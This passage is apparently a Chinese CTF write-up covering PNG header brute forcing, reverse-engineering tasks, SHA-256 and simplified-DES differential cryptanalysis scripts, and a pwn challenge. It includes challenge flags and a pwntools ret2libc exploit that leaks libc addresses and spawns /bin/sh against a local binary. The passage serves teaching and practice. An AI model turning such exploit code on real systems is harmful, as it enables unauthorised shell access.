+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>,<span class="number">256</span>):</span><br><span class="line">    b=hex(i)[<span class="number">2</span>:]</span><br><span class="line">    a=(<span class="string">'89504E470D0A1A0A0000000D49484452000003'</span>+b+<span class="string">'000001530802000000989E251C000000017352474200AECE1CE90000000467414D410000B18F0BFC61050000000970485973000012740000127401DE661F7800000B0349444154785EEDDD4B76A3C81200D0DA80861A6BA89987F5F6BFB3973F10E447266D49B6AAEF9D741982CC48A04F4421E4FA030000000000000000000000000000000000000000000000F0DF743A5F2ED7E47C8A3F9ECE51FC23BC3DF73300FF98D3E5E3EFDFFF2DAEE7B0E97CFD1B7C5C5E56EE62797DC7DA7AEB7A93CBE57CD222FC3E0FBC9FE38DEA1203F0B362EF169AB650DA42554AC2C657766FE7EB92C05B15C553C83BB5BBB5D4FEF2AB3CEE7E5EFEAAF3E13203F06352356A0ADBEBBAB73053A8857F43317CA7DEADB4BCA98A5FD28772D1E5121AD1BFBBB21E7BBC8F776B4CFF3D8FBC9F4FE7D2C0E9DF00F821A57BAB2AD1CBBAB73CFDBB7537E76B28DE87D2CE91BAB71FF6E8FB395F56ED1B003FA334223FD5BDE589DEAC0C8696F3684FA67BFB151E7D3FE7BF74E8DE0078B5FC3DBCDC8884C2963EFB5BBE3A30A876E190F48EFE4770BDDE7B433F076EC3F2B7FEEACF47BBDDDBEE1B82F97B0179A43054DAB655076FB24B9B5A47731B3AD4BDE5314BE4FAF16A73C6F2295D53FE7ECE9F5FA3F93316A3CAFC31EE4E607028D56D0E25E1DD67E7F3ABC8CB1864B7BB9FD3D0EBC0697FB2A4D91E1E94D9CA3EDD1B003F233D16AA2C05AEEDDEFA2FE9C7F7D54AC0AA1319DB977EC7D3EDDED6D96391CC23AC06237482C3C626B9A9DCC6965377E788DCE155AA95B63129E76ACCE3391FBC4653672C24195FE62B118B5E9EC1F154D71CC21165F0E5DC7C7715C17EAEE05EF03A6EBE1CCDB151D9B50D0DE3B5270B009E2B3FBCC8652994ACF46C617996B156BBF45314EBD5477C86541E3F9C9677B7AB1A168ECC03A6D064898CDBFB65B55F983FC261FB61CA20BBF05DF0121B3B8E18D984A68D0773BBE3D604C433D73D2C3FAC290D419830BB3DD8290D414A3A6F28C1FB3C66723E788D26CE584E32B87D23390CBA7457ED650B1B8FA55A72B8C6CEB09C9DCB250FF795556C272CD37DBEE4D238DE961C678E61CD7D107784C8DB9039B25A3F00BCC8D1F7DE62B92B7F5CB52F75A5AAB6AB73D9B2BDA98C79A2CEECBDACE23069FB769425B81AB9CD643AB7FB62BF138ECA52FF5076EC8CDE7B4B93B68D4259E09AE25CCEC7AED1F7CF581AA21E612ED5E1259E5EC5436F92B2AE6AC814B69B286F697307805738DABDF53455AD14CEDE71A52E56BBFACD4DA9B5836176E5B6B7258BC96D0799CEED80F41C2A1E9BAD8FD16E06DD5B49A62DFFFB53FA809CF703260F3863CBB0B77D93A9961CBA63778C573198B05AE0274BBE6DEFFDEF90F3DF4F1407ACC200E05526BBB753FC40707D833D56B5EDB1BD3A57B4D53D753EDD5986B307CD14C3E02A722AB729F123B8A587AB07E9776FA569281F196E9573524EE9D772BE7F8D0E9FB125C9DEECEBDE75DCC954630EDBC35B5F5E45D024330CEE46EE13EB1FBB2C2A5CC2B205005EE570F7965E138A856DD5D4D4BAA26F3525BC04779E570DEA65D62DB7070AF3546E5F3078E3EA6EF736B29CD2E99C0F5CA3E001676CDD7B24B897EA3087E09BAB08F60B090E2E392AD9AE53E52BD82E2CBD8E571D0B002F71B07B2B61E5FDF0B23196EC603D76B68487329DAA727DC0B0D6064DB91D06EF236773FB8A32CE763D77BBB7D0B90EE4533C99F3A16B143CE08CDD967020B893EA3887EFAF22D82F2438B8E4643F570E68D6B5AEB7373D003CD7A1EEADD4AABAFAD535751096847D71A26A5F1EA13E60586BF3AE5435CBCF778273DD5D76CCE7F6057939DB81FADD5B95DBC854CE83E092D2F6FA1E3C63F7938C8384BDCBB853A906A31C1EB08A26B760181C76B4D3E58DE9F07CE076DE24E7D39D1C009EEE50F7167FDC97C3A854E5CDB1BD3A9D95AADCECEA56C7325D6798E5C1CC664F95EA4DD8B11D643EB779EDC91C746FE3647666723E7A8DA6CF587D759266A533A906A31CE656113676979182B77B8E2EB9C8235CCF79DECE61714DFD130300CFD7361C5155ED4A01DE95B154C0EA63978DFB82573E218DC16D9D8C1375668FC155741C266DDF8557A9DEE4496F3BA6731B0A23A5DF1A567E2CD2EB5A719C6D7AFDD33B4A263A9D37BF7C6422E7185A472E87EF13387CC652643CBCFA8070B910DDB9F6E38E4EEF2887B955A48DED8469FBD76E9222C75FAFF13F9DA3724AED5505809738D4BDC56A15C2629DFB08252D7E0F30FE39FDAED5EAD83532FEC6D51C9A86CA8734A5B094C9EEECF95DF5ED8C7184CF525D851DF1F0CD8EC9DC866EE3C424E33039D5BC653F4A4C2F6ECF137EDCBEA1B81D24ED8B723EDB118EE7BC466ECF588C8BF1DB933671C6E2A04B93B464B9E6530F703CD53B39CCAEE2E13749B6594B7B50392DF52400F022C7BAB750AFCE4B69CCE2BE5CC39A2256FDDB4AA17C9F536CFC731D9B271ACDDE4C7AEDD6DF1C5C7E5E750BF34C6E63CBBF4C50496FDA97909BCD3728AB95C6E56D9209623B523DE89AC8F9E0359A3B6339CB3C60168EED2E34389CEA3087F9553CFE2689D28C61D72EEB55CEA7BF0F007E97F87BF06FDF04BCAB842EB1BD121EE4B25A6DAD6A6D19E8D0ACC794013FC9ED736598A86C19B91794F74565435709F93CE77DDCC394618F0C5C023F4FF58EFD101D4FBE49727F364A7A7931AEFC0800FFA2580C43C16B1E72E422596D1E3E29798E516EBFD91BE5FCA4549F7B9384D1EFF4676149EF76C300C0ACF2F96CAFDEA55DB116DE3E317C6DF77627B75FEB8D727E56AA4FBD49C6832F9F23BFD90D030063A1ECE5DFB35A7E8EE56E79176AF8242314C48F8F4D357C5261FE4A6E3FED8D727E71AA4FBA4982F2B0B09F73DCD97B391100DE56ACA9A1F2B566EADD930AF3C1DC4EF1DFD61C7BED1397879CCFD77871AA4FB84996C7C0C153DA4200F8A54EF1894BFA97C58BEB65F005C5A1F42C2E1CF7F0FA7928B73CFBD0AB1F783DE07CBECA4B537DC24DB25CF9D1376A01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000FE4BFEFCF93F29520FC4D05FB0A10000000049454E44AE426082'</span>).decode(<span class="string">"hex"</span>)</span><br><span class="line">    f=open(<span class="string">'1\\'</span>+b+<span class="string">'.png'</span>,<span class="string">"wb"</span>)</span><br><span class="line">    f.write(a)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
+<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>考察 IDAPatch 的使用     <code>flag{why_need_so_large_ram_emmmmmmm}</code></p>
+<ul>
+<li><p>环境搭建：</p>
+<ol>
+<li>直接下发 <code>fakeRam</code> 程序</li>
+</ol>
+</li>
+<li><p>题解：</p>
+<p>利用 IDAPatch nop 掉所有严重与等待后重新运行即可自动输出 flag</p>
+</li>
+</ul>
+<h4 id="c-STL"><a href="#c-STL" class="headerlink" title="c++STL"></a>c++STL</h4><p>考察c++STL容器基础</p>
+<p>开始创建三个vector容器<br>第一个放入输入的16个数字<br>第二个放入从500开始的16个素数<br>第三个倒序放入第一个容器的16个数字<br>比较第三和第二个容器<br>相等则得到flag</p>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h4 id="sha256"><a href="#sha256" class="headerlink" title="sha256"></a>sha256</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">sssk=string.printable</span><br><span class="line">text2=<span class="string">"sha256_is_too_"</span></span><br><span class="line">text1=<span class="string">"6348306011488e60120a6b99fbbb13f09336235fb790f8f904e97846b1418e48"</span></span><br><span class="line"><span class="comment">#sha256_is_too_e@$Y</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> sssk:</span><br><span class="line">	<span class="keyword">for</span> i2 <span class="keyword">in</span> sssk:</span><br><span class="line">		<span class="keyword">for</span> i3 <span class="keyword">in</span> sssk:</span><br><span class="line">			<span class="keyword">for</span> i4 <span class="keyword">in</span> sssk:</span><br><span class="line">				text3=text2+i1+i2+i3+i4</span><br><span class="line">				<span class="keyword">if</span> sha256(text3).hexdigest()==text1:</span><br><span class="line">					text4=i1+i2+i3+i4</span><br><span class="line">					<span class="keyword">print</span> i1+i2+i3+i4</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> text3</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>考察简化的DES差分分析</p>
+<figure class="highlight python"><figcaption><span>round1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SBOX = [[[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]]</span></span><br><span class="line"><span class="comment">#为了方便这里只选择SBOX中的S1盒进行演示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sbox</span><span class="params">(a,b)</span>:</span></span><br><span class="line">	sbox1=[[<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">		[<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">		[<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">		[<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]]</span><br><span class="line"></span><br><span class="line">	<span class="comment">#存储S1盒output的异或值</span></span><br><span class="line">	sout_table=[<span class="number">0</span>]</span><br><span class="line">	sout_text=[<span class="string">''</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>*<span class="number">16</span>):</span><br><span class="line">		sout_table.append(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>*<span class="number">16</span>):</span><br><span class="line">		sout_text.append(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> Si <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">		<span class="keyword">for</span> Se1 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">			Se2=Se1^Si</span><br><span class="line">			</span><br><span class="line">			<span class="comment">#计算Se1经过S1盒的值</span></span><br><span class="line">			bits1 = bin(Se1).replace(<span class="string">'0b'</span>,<span class="string">''</span>).rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">			row1 = int(bits1[<span class="number">0</span>])*<span class="number">2</span>+int(bits1[<span class="number">5</span>])</span><br><span class="line">			col1 = int(bits1[<span class="number">1</span>])*<span class="number">8</span>+int(bits1[<span class="number">2</span>])*<span class="number">4</span>+int(bits1[<span class="number">3</span>])*<span class="number">2</span>+int(bits1[<span class="number">4</span>])</span><br><span class="line">			val1 = bin(sbox1[row1][col1])[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">			<span class="comment">#计算Se2经过S1盒的值</span></span><br><span class="line">			bits2 = bin(Se2).replace(<span class="string">'0b'</span>,<span class="string">''</span>).rjust(<span class="number">6</span>,<span class="string">'0'</span>)</span><br><span class="line">			row2 = int(bits2[<span class="number">0</span>])*<span class="number">2</span>+int(bits2[<span class="number">5</span>])</span><br><span class="line">			col2 = int(bits2[<span class="number">1</span>])*<span class="number">8</span>+int(bits2[<span class="number">2</span>])*<span class="number">4</span>+int(bits2[<span class="number">3</span>])*<span class="number">2</span>+int(bits2[<span class="number">4</span>])</span><br><span class="line">			val2 = bin(sbox1[row2][col2])[<span class="number">2</span>:]</span><br><span class="line">			So=int(val1,<span class="number">2</span>)^int(val2,<span class="number">2</span>)</span><br><span class="line">			</span><br><span class="line">			<span class="comment">#将相应表项加1</span></span><br><span class="line">			sout_table[Si*<span class="number">16</span>+So]=sout_table[Si*<span class="number">16</span>+So]+<span class="number">1</span></span><br><span class="line">			sout_text[Si*<span class="number">16</span>+So]=sout_text[Si*<span class="number">16</span>+So]+str(Se1).zfill(<span class="number">2</span>)</span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	for i in range(0,64):</span></span><br><span class="line"><span class="string">		s=str(i)+" : "</span></span><br><span class="line"><span class="string">		for j in range(0,16):</span></span><br><span class="line"><span class="string">			s=s+str(sout_table[i*16+j])+"  "</span></span><br><span class="line"><span class="string">		print(s)</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"><span class="comment">#	print(sout_text[a*16+b])</span></span><br><span class="line">	<span class="keyword">return</span> sout_text[a*<span class="number">16</span>+b]</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> round1 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decry_xor</span><span class="params">(decry1,decry2,num)</span>:</span></span><br><span class="line">	a=decry1[num*<span class="number">4</span>:num*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">	b=decry2[num*<span class="number">4</span>:num*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">	<span class="keyword">return</span> int(a,<span class="number">2</span>)^int(b,<span class="number">2</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">en_xor</span><span class="params">(number1,number2,number3)</span>:</span></span><br><span class="line">	num1=E_change(bin(chain[number1])[<span class="number">2</span>:].zfill(<span class="number">32</span>),number3)</span><br><span class="line">	num2=E_change(bin(chain[number2])[<span class="number">2</span>:].zfill(<span class="number">32</span>),number3)</span><br><span class="line">	<span class="keyword">return</span> num1^num2,num1,num2</span><br><span class="line">subkey=bin(<span class="number">0x987654321098</span>)[<span class="number">2</span>:]</span><br><span class="line">print(subkey)</span><br><span class="line">chain=[<span class="number">0x92d91525</span>,<span class="number">0x81c82636</span>,<span class="number">0xa3d71597</span>,<span class="number">0xc2a41239</span>,<span class="number">0xa4824698</span>,<span class="number">0x45681249</span>]</span><br><span class="line"><span class="comment">#密文</span></span><br><span class="line"><span class="comment">#0x6148b286                                                                                                              #0x7d4d21d3                                                                                                              #0xaecabffe                                                                                                              #0x74d08779                                                                                                              #0xc8e3d2a4                                                                                                              #0x8d9d872f </span></span><br><span class="line">cipher=[<span class="string">'01100001010010001011001010000110'</span>,<span class="string">'01111101010011010010000111010011'</span>,<span class="string">'10101110110010101011111111111110'</span>,<span class="string">'01110100110100001000011101111001'</span>,<span class="string">'11001000111000111101001010100100'</span>,<span class="string">'10001101100111011000011100101111'</span>]</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">for i in range(6):</span></span><br><span class="line"><span class="string">	plaintext=bin(chain[i])[2:].zfill(32)</span></span><br><span class="line"><span class="string">	cipher[i]=(F(plaintext,subkey))</span></span><br><span class="line"><span class="string">print(cipher)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">en_xo=[[],[],[]]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	en_xo=en_xor(a,b,c)</span><br><span class="line">	<span class="comment">#print(en_xo)</span></span><br><span class="line">	de_xo=decry_xor(cipher[a],cipher[b],c)</span><br><span class="line">	result=Sbox(en_xo[<span class="number">0</span>],de_xo)</span><br><span class="line"><span class="comment">#	print(result)</span></span><br><span class="line">	resu=[<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>]</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(result)/<span class="number">2</span>)):</span><br><span class="line">		resu[i]=(result[<span class="number">2</span>*i]+result[<span class="number">2</span>*i+<span class="number">1</span>])</span><br><span class="line">	print(<span class="string">"key:"</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(result)/<span class="number">2</span>)):</span><br><span class="line">		print(en_xo[<span class="number">1</span>]^int(resu[i]))</span><br><span class="line">	<span class="comment">#	print(en_xo[2]^int(resu[i]))</span></span><br><span class="line">a=int(input())<span class="comment">#第a+1个明文</span></span><br><span class="line">b=int(input())<span class="comment">#第b+1个明文</span></span><br><span class="line">c=int(input())<span class="comment">#明文的第c+1至c+5个bit位</span></span><br><span class="line">getkey(a,b,c)</span><br></pre></td></tr></table></figure>
+<p>根据明文和密文，每两对4bit的明文和6bit的密文可以获得一组key，多组明文密文的组合可以得到做个key的集合，最后几个集合的交集就是key，8个key合在一起就是subkey，有了key就可以进行解密，然后得到明文flag</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="001"><a href="#001" class="headerlink" title="001"></a>001</h4><p>考察基础的ret2libc和ret2plt </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s=process(<span class="string">"./pwn"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">game_addr=elf.symbols[<span class="string">'game'</span>]</span><br><span class="line"> </span><br><span class="line">write_libc_addr=libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">system_addr=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"> </span><br><span class="line">sh_addr=next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(write_plt)+p32(game_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">write_addr=u32(s.recvuntil(<span class="string">"What'"</span>)[<span class="number">-9</span>:<span class="number">-5</span>])</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"> </span><br><span class="line">base_addr=write_addr-write_libc_addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(system_addr+base_addr)+p32(game_addr)+p32(sh_addr+base_addr)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"> 